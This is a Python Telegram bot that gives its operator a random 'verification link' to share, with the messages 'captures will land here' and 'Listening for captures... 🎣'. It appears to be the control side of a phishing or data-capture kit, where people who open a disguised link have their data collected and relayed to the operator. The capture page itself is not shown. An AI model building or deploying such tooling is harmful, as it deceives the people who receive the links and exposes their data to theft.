import os
import sys
import time
import logging
import secrets
import httpx
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import InvalidToken, TelegramError, NetworkError

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
    stream=sys.stdout,
)
log = logging.getLogger("bot")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
BASE_URL = os.environ.get("BASE_URL", "").strip().rstrip("/")


def validate_env():
    missing = []
    if not BOT_TOKEN:
        missing.append("BOT_TOKEN")
    if not BASE_URL:
        missing.append("BASE_URL")
    if missing:
        log.error("Missing env vars: %s", ", ".join(missing))
        return False
    log.info("bot env OK — BASE_URL=%s", BASE_URL)
    return True


def clear_webhook():
    if not BOT_TOKEN:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook"
        r = httpx.post(url, json={"drop_pending_updates": True}, timeout=10)
        data = r.json()
        if data.get("ok"):
            log.info("clear_webhook: cleared (polling OK)")
        else:
            log.warning("clear_webhook: %s", data)
    except Exception as e:
        log.warning("clear_webhook: failed — %s", e)


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message or not update.effective_chat:
            return
        token = secrets.token_urlsafe(8)
        link = f"{BASE_URL}/v/{token}"
        await update.message.reply_text(
            f"🔗 Your verification link:\n{link}\n\n"
            f"Share it — captures will land here."
        )
        log.info("start: token %s → chat %s", token, update.effective_chat.id)
    except Exception as e:
        log.exception("start: error — %s", e)


async def status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text("Listening for captures... 🎣")
    except Exception as e:
        log.exception("status: error — %s", e)


async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE):
    log.error("Update caused error:", exc_info=ctx.error)


def build_app():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_error_handler(error_handler)
    return app


def run_bot():
    if not validate_env():
        log.error("run_bot: env invalid, exiting")
        return

    clear_webhook()

    attempt = 0
    while True:
        attempt += 1
        try:
            log.info("bot polling starting (attempt %d)...", attempt)
            app = build_app()
            app.run_polling(
                drop_pending_updates=True,
                allowed_updates=Update.ALL_TYPES,
                close_loop=False,
                stop_signals=(),
            )
        except InvalidToken:
            log.error("BOT_TOKEN invalid — exiting thread")
            return
        except NetworkError as e:
            log.warning("network error: %s — retry in 5s", e)
            time.sleep(5)
        except Exception as e:
            backoff = min(60, 5 * attempt)
            log.exception("bot crashed — restart in %ds", backoff)
            time.sleep(backoff)


if __name__ == "__main__":
    run_bot()
